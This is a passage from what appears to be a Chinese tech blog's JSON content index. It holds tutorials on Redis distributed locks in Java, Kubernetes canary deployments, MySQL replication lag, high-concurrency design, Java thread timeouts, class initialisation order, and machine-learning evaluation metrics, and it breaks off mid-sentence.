Exists的缩写\n因为分布式锁还需要超时机制，所以我们利用expire命令来设置，所以利用setnx+expire命令的核心代码如下：\npublic boolean tryLock(String key,String requset,int timeout) { Long result = jedis.setnx(key, requset); // result = 1时，设置成功，否则设置失败 if (result == 1L) { return jedis.expire(key, timeout) == 1L; } else { return false; } } 复制代码 实际上上面的步骤是有问题的，setnx和expire是分开的两步操作，不具有原子性，如果执行完第一条指令应用异常或者重启了，锁将无法过期。\n一种改善方案就是使用Lua脚本来保证原子性（包含setnx和expire两条指令）\n2. 使用Lua脚本（包含setnx和expire两条指令） 代码如下\npublic boolean tryLock_with_lua(String key, String UniqueId, int seconds) { String lua_scripts = \u0026#34;if redis.call(\u0026#39;setnx\u0026#39;,KEYS[1],ARGV[1]) == 1 then\u0026#34; + \u0026#34;redis.call(\u0026#39;expire\u0026#39;,KEYS[1],ARGV[2]) return 1 else return 0 end\u0026#34;; List\u0026lt;String\u0026gt; keys = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;String\u0026gt; values = new ArrayList\u0026lt;\u0026gt;(); keys.add(key); values.add(UniqueId); values.add(String.valueOf(seconds)); Object result = jedis.eval(lua_scripts, keys, values); //判断是否成功  return result.equals(1L); } 3. 使用 set key value [EX seconds][PX milliseconds][NX|XX] 命令 (正确做法) Redis在 2.6.12 版本开始，为 SET 命令增加一系列选项：\nSET key value[EX seconds][PX milliseconds][NX|XX]  EX seconds: 设定过期时间，单位为秒 PX milliseconds: 设定过期时间，单位为毫秒 NX: 仅当key不存在时设置值 XX: 仅当key存在时设置值  set命令的nx选项，就等同于setnx命令，代码过程如下：\npublic boolean tryLock_with_set(String key, String UniqueId, int seconds) { return \u0026#34;OK\u0026#34;.equals(jedis.set(key, UniqueId, \u0026#34;NX\u0026#34;, \u0026#34;EX\u0026#34;, seconds)); } value必须要具有唯一性，我们可以用UUID来做，设置随机字符串保证唯一性，至于为什么要保证唯一性？假如value不是随机字符串，而是一个固定值，那么就可能存在下面的问题：\n 1.客户端1获取锁成功 2.客户端1在某个操作上阻塞了太长时间 3.设置的key过期了，锁自动释放了 4.客户端2获取到了对应同一个资源的锁 5.客户端1从阻塞中恢复过来，因为value值一样，所以执行释放锁操作时就会释放掉客户端2持有的锁，这样就会造成问题  所以通常来说，在释放锁时，我们需要对value进行验证\n释放锁的实现 释放锁时需要验证value值，也就是说我们在获取锁的时候需要设置一个value，不能直接用del key这种粗暴的方式，因为直接del key任何客户端都可以进行解锁了，所以解锁时，我们需要判断锁是否是自己的，基于value值来判断，代码如下：\npublic boolean releaseLock_with_lua(String key,String value) { String luaScript = \u0026#34;if redis.call(\u0026#39;get\u0026#39;,KEYS[1]) == ARGV[1] then \u0026#34; + \u0026#34;return redis.call(\u0026#39;del\u0026#39;,KEYS[1]) else return 0 end\u0026#34;; return jedis.eval(luaScript, Collections.singletonList(key), Collections.singletonList(value)).equals(1L); } 这里使用Lua脚本的方式，尽量保证原子性。\n使用 set key value [EX seconds][PX milliseconds][NX|XX] 命令 看上去很OK，实际上在Redis集群的时候也会出现问题，比如说A客户端在Redis的master节点上拿到了锁，但是这个加锁的key还没有同步到slave节点，master故障，发生故障转移，一个slave节点升级为master节点，B客户端也可以获取同个key的锁，但客户端A也已经拿到锁了，这就导致多个客户端都拿到锁。\n所以针对Redis集群这种情况，还有其他方案\n4. Redlock算法 与 Redisson 实现 Redis作者 antirez基于分布式环境下提出了一种更高级的分布式锁的实现Redlock，原理如下：\n 下面参考文章Redlock：Redis分布式锁最牛逼的实现 和 redis.io/topics/dist…  假设有5个独立的Redis节点（注意这里的节点可以是5个Redis单master实例，也可以是5个Redis Cluster集群，但并不是有5个主节点的cluster集群）：\n 获取当前Unix时间，以毫秒为单位 依次尝试从5个实例，使用相同的key和具有唯一性的value(例如UUID)获取锁，当向Redis请求获取锁时，客户端应该设置一个网络连接和响应超时时间，这个超时时间应用小于锁的失效时间，例如你的锁自动失效时间为10s，则超时时间应该在5~50毫秒之间，这样可以避免服务器端Redis已经挂掉的情况下，客户端还在死死地等待响应结果。如果服务端没有在规定时间内响应，客户端应该尽快尝试去另外一个Redis实例请求获取锁 客户端使用当前时间减去开始获取锁时间（步骤1记录的时间）就得到获取锁使用的时间，当且仅当从大多数(N/2+1，这里是3个节点)的Redis节点都取到锁，并且使用的时间小于锁失败时间时，锁才算获取成功。 如果取到了锁，key的真正有效时间等于有效时间减去获取锁所使用的时间（步骤3计算的结果） 如果某些原因，获取锁失败（没有在至少N/2+1个Redis实例取到锁或者取锁时间已经超过了有效时间），客户端应该在所有的Redis实例上进行解锁（即便某些Redis实例根本就没有加锁成功，防止某些节点获取到锁但是客户端没有得到响应而导致接下来的一段时间不能被重新获取锁）  Redisson实现简单分布式锁 对于Java用户而言，我们经常使用Jedis，Jedis是Redis的Java客户端，除了Jedis之外，Redisson也是Java的客户端，Jedis是阻塞式I/O，而Redisson底层使用Netty可以实现非阻塞I/O，该客户端封装了锁的，继承了J.U.C的Lock接口，所以我们可以像使用ReentrantLock一样使用Redisson，具体使用过程如下。\n 首先加入POM依赖  \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.redisson\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;redisson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.10.6\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;  使用Redisson，代码如下(与使用ReentrantLock类似）  // 1. 配置文件 Config config = new Config(); config.useSingleServer() .setAddress(\u0026#34;redis://127.0.0.1:6379\u0026#34;) .setPassword(RedisConfig.PASSWORD) .setDatabase(0); //2. 构造RedissonClient RedissonClient redissonClient = Redisson.create(config); //3. 设置锁定资源名称 RLock lock = redissonClient.getLock(\u0026#34;redlock\u0026#34;); lock.lock(); try { System.out.println(\u0026#34;获取锁成功，实现业务逻辑\u0026#34;); Thread.sleep(10000); } catch (InterruptedException e) { e.printStackTrace(); } finally { lock.unlock(); } 关于Redlock算法的实现，在Redisson中我们可以使用RedissonRedLock来完成，具体使用细节可以参考大佬的文章： mp.weixin.qq.com/s/8uhYult2h… Redis实现的分布式锁轮子 下面利用SpringBoot + Jedis + AOP的组合来实现一个简易的分布式锁。\n1. 自定义注解 自定义一个注解，被注解的方法会执行获取分布式锁的逻辑\n@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited public @interface RedisLock { /** * 业务键 * * @return */ String key(); /** * 锁的过期秒数,默认是5秒 * * @return */ int expire() default 5; /** * 尝试加锁，最多等待时间 * * @return */ long waitTime() default Long.MIN_VALUE; /** * 锁的超时时间单位 * * @return */ TimeUnit timeUnit() default TimeUnit.SECONDS; } 2. AOP拦截器实现 在AOP中我们去执行获取分布式锁和释放分布式锁的逻辑，代码如下：\n@Aspect @Component public class LockMethodAspect { @Autowired private RedisLockHelper redisLockHelper; @Autowired private JedisUtil jedisUtil; private Logger logger = LoggerFactory.getLogger(LockMethodAspect.class); @Around(\u0026#34;@annotation(com.redis.lock.annotation.RedisLock)\u0026#34;) public Object around(ProceedingJoinPoint joinPoint) { Jedis jedis = jedisUtil.getJedis(); MethodSignature signature = (MethodSignature) joinPoint.getSignature(); Method method = signature.getMethod(); RedisLock redisLock = method.getAnnotation(RedisLock.class); String value = UUID.randomUUID().toString(); String key = redisLock.key(); try { final boolean islock = redisLockHelper.lock(jedis,key, value, redisLock.expire(), redisLock.timeUnit()); logger.info(\u0026#34;isLock : {}\u0026#34;,islock); if (!islock) { logger.error(\u0026#34;获取锁失败\u0026#34;); throw new RuntimeException(\u0026#34;获取锁失败\u0026#34;); } try { return joinPoint.proceed(); } catch (Throwable throwable) { throw new RuntimeException(\u0026#34;系统异常\u0026#34;); } } finally { logger.info(\u0026#34;释放锁\u0026#34;); redisLockHelper.unlock(jedis,key, value); jedis.close(); } } } 3. Redis实现分布式锁核心类 @Component public class RedisLockHelper { private long sleepTime = 100; /** * 直接使用setnx + expire方式获取分布式锁 * 非原子性 * * @param key * @param value * @param timeout * @return */ public boolean lock_setnx(Jedis jedis,String key, String value, int timeout) { Long result = jedis.setnx(key, value); // result = 1时，设置成功，否则设置失败  if (result == 1L) { return jedis.expire(key, timeout) == 1L; } else { return false; } } /** * 使用Lua脚本，脚本中使用setnex+expire命令进行加锁操作 * * @param jedis * @param key * @param UniqueId * @param seconds * @return */ public boolean Lock_with_lua(Jedis jedis,String key, String UniqueId, int seconds) { String lua_scripts = \u0026#34;if redis.call(\u0026#39;setnx\u0026#39;,KEYS[1],ARGV[1]) == 1 then\u0026#34; + \u0026#34;redis.call(\u0026#39;expire\u0026#39;,KEYS[1],ARGV[2]) return 1 else return 0 end\u0026#34;; List\u0026lt;String\u0026gt; keys = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;String\u0026gt; values = new ArrayList\u0026lt;\u0026gt;(); keys.add(key); values.add(UniqueId); values.add(String.valueOf(seconds)); Object result = jedis.eval(lua_scripts, keys, values); //判断是否成功  return result.equals(1L); } /** * 在Redis的2.6.12及以后中,使用 set key value [NX] [EX] 命令 * * @param key * @param value * @param timeout * @return */ public boolean lock(Jedis jedis,String key, String value, int timeout, TimeUnit timeUnit) { long seconds = timeUnit.toSeconds(timeout); return \u0026#34;OK\u0026#34;.equals(jedis.set(key, value, \u0026#34;NX\u0026#34;, \u0026#34;EX\u0026#34;, seconds)); } /** * 自定义获取锁的超时时间 * * @param jedis * @param key * @param value * @param timeout * @param waitTime * @param timeUnit * @return * @throws InterruptedException */ public boolean lock_with_waitTime(Jedis jedis,String key, String value, int timeout, long waitTime,TimeUnit timeUnit) throws InterruptedException { long seconds = timeUnit.toSeconds(timeout); while (waitTime \u0026gt;= 0) { String result = jedis.set(key, value, \u0026#34;nx\u0026#34;, \u0026#34;ex\u0026#34;, seconds); if (\u0026#34;OK\u0026#34;.equals(result)) { return true; } waitTime -= sleepTime; Thread.sleep(sleepTime); } return false; } /** * 错误的解锁方法—直接删除key * * @param key */ public void unlock_with_del(Jedis jedis,String key) { jedis.del(key); } /** * 使用Lua脚本进行解锁操纵，解锁的时候验证value值 * * @param jedis * @param key * @param value * @return */ public boolean unlock(Jedis jedis,String key,String value) { String luaScript = \u0026#34;if redis.call(\u0026#39;get\u0026#39;,KEYS[1]) == ARGV[1] then \u0026#34; + \u0026#34;return redis.call(\u0026#39;del\u0026#39;,KEYS[1]) else return 0 end\u0026#34;; return jedis.eval(luaScript, Collections.singletonList(key), Collections.singletonList(value)).equals(1L); } } 4. Controller层控制 定义一个TestController来测试我们实现的分布式锁\n@RestController public class TestController { @RedisLock(key = \u0026#34;redis_lock\u0026#34;) @GetMapping(\u0026#34;/index\u0026#34;) public String index() { return \u0026#34;index\u0026#34;; } } 小结 分布式锁重点在于互斥性，在任意一个时刻，只有一个客户端获取了锁。在实际的生产环境中，分布式锁的实现可能会更复杂，而我这里的讲述主要针对的是单机环境下的基于Redis的分布式锁实现，至于Redis集群环境并没有过多涉及，有兴趣的朋友可以查阅相关资料。\n项目源码地址：github.com/pjmike/redi… 参考 基于Redis的分布式锁实现 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/%E5%9F%BA%E4%BA%8Eredis%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%AE%9E%E7%8E%B0/","series":["Manual"],"tags":["Redis"],"title":"基于Redis的分布式锁实现"},{"categories":["云原生"],"content":"如果您想使用 Deployment 将最新的应用程序版本发布给一部分用户（或服务器），您可以为每个版本创建一个 Deployment，此时，应用程序的新旧两个版本都可以同时获得生产上的流量。\n实施方案   部署第一个版本\n第一个版本的 Deployment 包含了 3 个Pod副本，Service 通过 label selector app: nginx 选择对应的 Pod，nginx 的标签为 1.7.9\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 3 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.7.9 --- apiVersion: v1 kind: Service metadata: name: nginx-service labels: app: nginx spec: selector: app: nginx ports: - name: nginx-port protocol: TCP port: 80 nodePort: 32600 targetPort: 80 type: NodePort   假设此时想要发布新的版本 nginx 1.8.0，可以创建第二个 Deployment：\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment-canary labels: app: nginx track: canary spec: replicas: 1 selector: matchLabels: app: nginx track: canary template: metadata: labels: app: nginx track: canary spec: containers: - name: nginx image: nginx:1.8.0  因为 Service 的LabelSelector 是 app: nginx，由 nginx-deployment 和 nginx-deployment-canary 创建的 Pod 都带有标签 app: nginx，所以，Service 的流量将会在两个 release 之间分配 在新旧版本之间，流量分配的比例为两个版本副本数的比例，此处为 1:3 当您确定新的版本没有问题之后，可以将 nginx-deployment 的镜像标签修改为新版本的镜像标签，并在完成对 nginx-deployment 的滚动更新之后，删除 nginx-deployment-canary 这个 Deployment    局限性 按照 Kubernetes 默认支持的这种方式进行金丝雀发布，有一定的局限性：\n 不能根据用户注册时间、地区等请求中的内容属性进行流量分配 同一个用户如果多次调用该 Service，有可能第一次请求到了旧版本的 Pod，第二次请求到了新版本的 Pod  TIP 在 Kubernetes 中不能解决上述局限性的原因是：Kubernetes Service 只在 TCP 层面解决负载均衡的问题，并不对请求响应的消息内容做任何解析和识别。如果想要更完善地实现金丝雀发布，可以考虑如下三种选择：\n 业务代码编码实现 Spring Cloud 灰度发布 Istio 灰度发布  ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6/%E5%A4%9Apod%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6/","series":["k8s"],"tags":["云原生","k8s"],"title":"多Pod实现灰度"},{"categories":["编程思想"],"content":"你们有没有做 MySQL 读写分离？如何实现 MySQL 的读写分离？MySQL 主从复制原理的是啥？如何解决 MySQL 主从同步的延时问题？\n如何实现 MySQL 的读写分离？ 其实很简单，就是基于主从复制架构，简单来说，就搞一个主库，挂多个从库，然后我们就单单只是写主库，然后主库会自动把数据给同步到从库上去。\nMySQL 主从复制原理的是啥？ 主库将变更写入 binlog 日志，然后从库连接到主库之后，从库有一个 IO 线程，将主库的 binlog 日志拷贝到自己本地，写入一个 relay 中继日志中。接着从库中有一个 SQL 线程会从中继日志读取 binlog，然后执行 binlog 日志中的内容，也就是在自己本地再次执行一遍 SQL，这样就可以保证自己跟主库的数据是一样的。\n这里有一个非常重要的一点，就是从库同步主库数据的过程是串行化的，也就是说主库上并行的操作，在从库上会串行执行。所以这就是一个非常重要的点了，由于从库从主库拷贝日志以及串行执行 SQL 的特点，在高并发场景下，从库的数据一定会比主库慢一些，是有延时的。所以经常出现，刚写入主库的数据可能是读不到的，要过几十毫秒，甚至几百毫秒才能读取到。\n而且这里还有另外一个问题，就是如果主库突然宕机，然后恰好数据还没同步到从库，那么有些数据可能在从库上是没有的，有些数据可能就丢失了。\n所以 MySQL 实际上在这一块有两个机制，一个是半同步复制，用来解决主库数据丢失问题；一个是并行复制，用来解决主从同步延时问题。\n这个所谓半同步复制，也叫 semi-sync 复制，指的就是主库写入 binlog 日志之后，就会将强制此时立即将数据同步到从库，从库将日志写入自己本地的 relay log 之后，接着会返回一个 ack 给主库，主库接收到至少一个从库的 ack 之后才会认为写操作完成了。\n所谓并行复制，指的是从库开启多个线程，并行读取 relay log 中不同库的日志，然后并行重放不同库的日志，这是库级别的并行。\nMySQL 主从同步延时问题（精华） 以前线上确实处理过因为主从同步延时问题而导致的线上的 bug，属于小型的生产事故。\n是这个么场景。有个同学是这样写代码逻辑的。先插入一条数据，再把它查出来，然后更新这条数据。在生产环境高峰期，写并发达到了 2000/s，这个时候，主从复制延时大概是在小几十毫秒。线上会发现，每天总有那么一些数据，我们期望更新一些重要的数据状态，但在高峰期时候却没更新。用户跟客服反馈，而客服就会反馈给我们。\n我们通过 MySQL 命令：\nshow slave status 查看 Seconds_Behind_Master ，可以看到从库复制主库的数据落后了几 ms。\n一般来说，如果主从延迟较为严重，有以下解决方案：\n 分库，将一个主库拆分为多个主库，每个主库的写并发就减少了几倍，此时主从延迟可以忽略不计。（主库压力大导致延时） 打开 MySQL 支持的并行复制，多个库并行复制。如果说某个库的写入并发就是特别高，单库写并发达到了 2000/s，并行复制还是没意义。（从库压力大导致延时） 重写代码，写代码的同学，要慎重，插入数据时立马查询可能查不到。（主从复制无法避免的延时） 如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询设置直连主库。不推荐这种方法，你要是这么搞，读写分离的意义就丧失了。（主从复制无法避免的延时）  参考 你们有没有做 MySQL 读写分离？如何实现 MySQL 的读写分离？MySQL 主从复制原理的是啥？如何解决 MySQL 主从同步的延时问题？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3mysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E7%9A%84%E5%BB%B6%E6%97%B6%E9%97%AE%E9%A2%98/","series":["Manual"],"tags":["MySQL"],"title":"如何解决MySQL主从同步的延时问题"},{"categories":["架构演进"],"content":"其实所谓的高并发，如果你要理解这个问题呢，其实就得从高并发的根源出发，为啥会有高并发？为啥高并发就很牛逼？\n我说的浅显一点，很简单，就是因为刚开始系统都是连接数据库的，但是要知道数据库支撑到每秒并发两三千的时候，基本就快完了。所以才有说，很多公司，刚开始干的时候，技术比较 low，结果业务发展太快，有的时候系统扛不住压力就挂了。\n当然会挂了，凭什么不挂？你数据库如果瞬间承载每秒 5000/8000，甚至上万的并发，一定会宕机，因为比如 mysql 就压根儿扛不住这么高的并发量。\n所以为啥高并发牛逼？就是因为现在用互联网的人越来越多，很多 app、网站、系统承载的都是高并发请求，可能高峰期每秒并发量几千，很正常的。如果是什么双十一之类的，每秒并发几万几十万都有可能。\n那么如此之高的并发量，加上原本就如此之复杂的业务，咋玩儿？真正厉害的，一定是在复杂业务系统里玩儿过高并发架构的人，但是你没有，那么我给你说一下你该怎么回答这个问题：\n可以分为以下 6 点：\n 系统拆分 缓存 MQ 分库分表 读写分离 ElasticSearch  系统拆分 将一个系统拆分为多个子系统，用 dubbo 来搞。然后每个系统连一个数据库，这样本来就一个库，现在多个数据库，不也可以扛高并发么。\n缓存 缓存，必须得用缓存。大部分的高并发场景，都是读多写少，那你完全可以在数据库和缓存里都写一份，然后读的时候大量走缓存不就得了。毕竟人家 redis 轻轻松松单机几万的并发。所以你可以考虑考虑你的项目里，那些承载主要请求的读场景，怎么用缓存来抗高并发。\nMQ MQ，必须得用 MQ。可能你还是会出现高并发写的场景，比如说一个业务操作里要频繁搞数据库几十次，增删改增删改，疯了。那高并发绝对搞挂你的系统，你要是用 redis 来承载写那肯定不行，人家是缓存，数据随时就被 LRU 了，数据格式还无比简单，没有事务支持。所以该用 mysql 还得用 mysql 啊。那你咋办？用 MQ 吧，大量的写请求灌入 MQ 里，排队慢慢玩儿，后边系统消费后慢慢写，控制在 mysql 承载范围之内。所以你得考虑考虑你的项目里，那些承载复杂写业务逻辑的场景里，如何用 MQ 来异步写，提升并发性。MQ 单机抗几万并发也是 ok 的，这个之前还特意说过。\n分库分表 分库分表，可能到了最后数据库层面还是免不了抗高并发的要求，好吧，那么就将一个数据库拆分为多个库，多个库来扛更高的并发；然后将一个表拆分为多个表，每个表的数据量保持少一点，提高 sql 跑的性能。\n读写分离 读写分离，这个就是说大部分时候数据库可能也是读多写少，没必要所有请求都集中在一个库上吧，可以搞个主从架构，主库写入，从库读取，搞一个读写分离。读流量太多的时候，还可以加更多的从库。\nElasticSearch Elasticsearch，简称 es。es 是分布式的，可以随便扩容，分布式天然就可以支撑高并发，因为动不动就可以扩容加机器来扛更高的并发。那么一些比较简单的查询、统计类的操作，可以考虑用 es 来承载，还有一些全文搜索类的操作，也可以考虑用 es 来承载。\n参考 如何设计一个高并发系统？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E9%AB%98%E5%B9%B6%E5%8F%91%E7%B3%BB%E7%BB%9F/","series":["Manual"],"tags":["SA"],"title":"如何设计一个高并发系统"},{"categories":["编程思想"],"content":"1. 基于线程的join(long millis)方法 其实这个方法比较牵强，因为它主要作用是用来多个线程之间进行同步的。但因为它提供了这个带参数的方法（所以这也给了我们一个更广泛的思路，就是一般带有超时参数的方法我们都可以尝试着用它来实现超时结束任务），所以我们可以用它来实现。注意这里的参数的单位是固定的毫秒，不同于接下来的带单位的函数。具体用法请看示例：\npublic class JoinTest { public static void main(String[] args) { Task task1 = new Task(\u0026#34;one\u0026#34;, 4); Task task2 = new Task(\u0026#34;two\u0026#34;, 2); Thread t1 = new Thread(task1); Thread t2 = new Thread(task2); t1.start(); try { t1.join(2000); // 在主线程中等待t1执行2秒  } catch (InterruptedException e) { System.out.println(\u0026#34;t1 interrupted when waiting join\u0026#34;); e.printStackTrace(); } t1.interrupt(); // 这里很重要，一定要打断t1,因为它已经执行了2秒。  t2.start(); try { t2.join(1000); } catch (InterruptedException e) { System.out.println(\u0026#34;t2 interrupted when waiting join\u0026#34;); e.printStackTrace(); } } } class Task implements Runnable { public String name; private int time; public Task(String s, int t) { name = s; time = t; } public void run() { for (int i = 0; i \u0026lt; time; ++i) { System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; \u0026#34; + (i + 1) + \u0026#34; round\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { System.out.println(name + \u0026#34;is interrupted when calculating, will stop...\u0026#34;); return; // 注意这里如果不return的话，线程还会继续执行，所以任务超时后在这里处理结果然后返回  } } } } 2. Future.get(long million, TimeUnit unit) 配合Future.cancle(true) public class FutureTest { static class Task implements Callable\u0026lt;Boolean\u0026gt; { public String name; private int time; public Task(String s, int t) { name = s; time = t; } @Override public Boolean call() throws Exception { for (int i = 0; i \u0026lt; time; ++i) { System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; round \u0026#34; + (i + 1)); try { Thread.sleep(1000); } catch (InterruptedException e) { System.out.println(name + \u0026#34; is interrupted when calculating, will stop...\u0026#34;); return false; // 注意这里如果不return的话，线程还会继续执行，所以任务超时后在这里处理结果然后返回  } } return true; } } public static void main(String[] args) { ExecutorService executor = Executors.newCachedThreadPool(); Task task1 = new Task(\u0026#34;one\u0026#34;, 5); Future\u0026lt;Boolean\u0026gt; f1 = executor.submit(task1); try { if (f1.get(2, TimeUnit.SECONDS)) { // future将在2秒之后取结果  System.out.println(\u0026#34;one complete successfully\u0026#34;); } } catch (InterruptedException e) { System.out.println(\u0026#34;future在睡着时被打断\u0026#34;); executor.shutdownNow(); } catch (ExecutionException e) { System.out.println(\u0026#34;future在尝试取得任务结果时出错\u0026#34;); executor.shutdownNow(); } catch (TimeoutException e) { System.out.println(\u0026#34;future时间超时\u0026#34;); f1.cancel(true); // executor.shutdownNow();  // executor.shutdown();  } finally { executor.shutdownNow(); } } } 3. 定时器或者守护线程 这两种方法本质上是一样的，都是通过持有目标线程的引用，在定时结束后打断目标线程，这两种方法的控制精度最低，因为它是采用另一个线程来监视目标线程的运行时间，因为线程调度的不确定性，另一个线程在定时结束后不一定会马上得到执行而打断目标线程。\n总结：需要注意的是，无论以上哪一种方法，其实现原理都是在超时后通过interrupt打断目标线程的运行，所以都要在捕捉到InterruptedException的catch代码块中return,否则线程仍然会继续执行。\n参考链接： Java多线程任务超时结束的5种实现方法 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E8%B6%85%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","series":["Manual"],"tags":["Java"],"title":"实现线程超时的几种方式"},{"categories":["编程思想"],"content":"父类静态成员变量、父类静态代码块 👉🏿 子类静态成员变量、子类静态代码块 👉🏿 父类成员变量、父类代码块 👉🏿 父类构造方法 👉🏿 子类成员变量、子类代码块 👉🏿 子类构造方法\nJava中类及方法的加载顺序 Java类加载顺序 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E5%AF%B9%E8%B1%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%BA%E5%BA%8F/","series":["Manual"],"tags":["Java"],"title":"对象初始化顺序"},{"categories":["编程思想"],"content":"1. 生产消费模型 参考：Kafka生产者消费者模型 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/kafka/%E5%B8%B8%E5%A4%87%E7%9F%A5%E8%AF%86%E7%82%B9/","series":["Manual"],"tags":["Kafka"],"title":"常备知识点"},{"categories":["人工智能"],"content":"“没有测量，就没有科学。”这是科学家门捷列夫的名言。在计算机科学中，特别是在机器学习的领域，对模型的测量和评估同样至关重要。只有选择与问题相匹配的评估方法，我们才能够快速的发现在模型选择和训练过程中可能出现的问题，迭代地对模型进行优化。本文将总结机器学习最常见的模型评估指标，其中包括：\n precision recall F1-score PRC ROC和AUC IOU  从混淆矩阵谈起 看一看下面这个例子：假定瓜农拉来一车西瓜，我们用训练好的模型对这些西瓜进行判别，显然我们可以使用错误率来衡量有多少比例的瓜被判别错误。但如果我们关心的是“挑出的西瓜中有多少比例是好瓜”，或者“所有好瓜中有多少比例被挑出来了”，那么错误率显然就不够用了，这时我们需要引入新的评估指标，比如“查准率”和查全率更适合此类需求的性能度量。\n在引入查全率和查准率之前我们必须先理解到什么是混淆矩阵（Confusion matrix）。这个名字起得是真的好，初学者很容易被这个矩阵搞得晕头转向。下图a就是有名的混淆矩阵，而下图b则是由混淆矩阵推出的一些有名的评估指标。\n我们首先好好解读一下混淆矩阵里的一些名词和其意思。根据混淆矩阵我们可以得到TP,FN,FP,TN四个值，显然TP+FP+TN+FN=样本总数。这四个值中都带两个字母，单纯记忆这四种情况很难记得牢，我们可以这样理解：第一个字母表示本次预测的正确性，T就是正确，F就是错误；第二个字母则表示由分类器预测的类别，P代表预测为正例，N代表预测为反例。比如TP我们就可以理解为分类器预测为正例（P），而且这次预测是对的（T），FN可以理解为分类器的预测是反例（N），而且这次预测是错误的（F），正确结果是正例，即一个正样本被错误预测为负样本。我们使用以上的理解方式来记住TP、FP、TN、FN的意思应该就不再困难了。，下面对混淆矩阵的四个值进行总结性讲解：\n True Positive （真正，TP）被模型预测为正的正样本 True Negative（真负 , TN）被模型预测为负的负样本 False Positive （假正, FP）被模型预测为正的负样本 False Negative（假负 , FN）被模型预测为负的正样本  Precision、Recall、PRC、F1-score Precision指标在中文里可以称为查准率或者是精确率，Recall指标在中卫里常被称为查全率或者是召回率，查准率 P和查全率 R分别定义为：\n查准率P和查全率R的具体含义如下：\n  查准率(Precision）是指在所有系统判定的“真”的样本中，确实是真的的占比\n  查全率（Recall）是指在所有确实为真的样本中，被判为的“真”的占比\n  这里想强调一点，precision和accuracy（正确率）不一样的，accuracy针对所有样本，precision针对部分样本，即正确的预测/总的正反例：\n查准率和查全率是一对矛盾的度量，一般而言，查准率高时，查全率往往偏低；而查全率高时，查准率往往偏低。我们从直观理解确实如此：我们如果希望好瓜尽可能多地选出来，则可以通过增加选瓜的数量来实现，如果将所有瓜都选上了，那么所有好瓜也必然被选上，但是这样查准率就会越低；若希望选出的瓜中好瓜的比例尽可能高，则只选最有把握的瓜，但这样难免会漏掉不少好瓜，导致查全率较低。通常只有在一些简单任务中，才可能使查全率和查准率都很高。\n再说PRC， 其全称就是Precision Recall Curve，它以查准率为Y轴，、查全率为X轴做的图。它是综合评价整体结果的评估指标。所以，哪种类型（正或者负）样本多，权重就大。也就是通常说的『对样本不均衡敏感』，『容易被多的样品带走』。\n上图就是一幅P-R图，它能直观地显示出学习器在样本总体上的查全率和查准率，显然它是一条总体趋势是递减的曲线。在进行比较时，若一个学习器的PR曲线被另一个学习器的曲线完全包住，则可断言后者的性能优于前者，比如上图中A优于C。但是B和A谁更好呢？因为AB两条曲线交叉了，所以很难比较，这时比较合理的判据就是比较PR曲线下的面积，该指标在一定程度上表征了学习器在查准率和查全率上取得相对“双高”的比例。因为这个值不容易估算，所以人们引入“平衡点”(BEP)来度量，他表示“查准率=查全率”时的取值，值越大表明分类器性能越好，以此比较我们一下子就能判断A较B好。\nBEP还是有点简化了，更常用的是F1度量：\nF1-score 就是一个综合考虑precision和recall的指标，比BEP更为常用。\nROC \u0026 AUC ROC全称是“受试者工作特征”（Receiver Operating Characteristic）曲线，ROC曲线以“真正例率”（TPR）为Y轴，以“假正例率”（FPR）为X轴，对角线对应于“随机猜测”模型，而（0,1）则对应“理想模型”。ROC形式如下图所示。\nTPR和FPR的定义如下：\n从形式上看TPR就是我们上面提到的查全率Recall，而FPR的含义就是：所有确实为“假”的样本中，被误判真的样本。\n进行学习器比较时，与PR图相似，若一个学习器的ROC曲线被另一个学习器的曲线包住，那么我们可以断言后者性能优于前者；若两个学习器的ROC曲线发生交叉，则难以一般性断言两者孰优孰劣。此时若要进行比较，那么可以比较ROC曲线下的面积，即AUC，面积大的曲线对应的分类器性能更好。\nAUC（Area Under 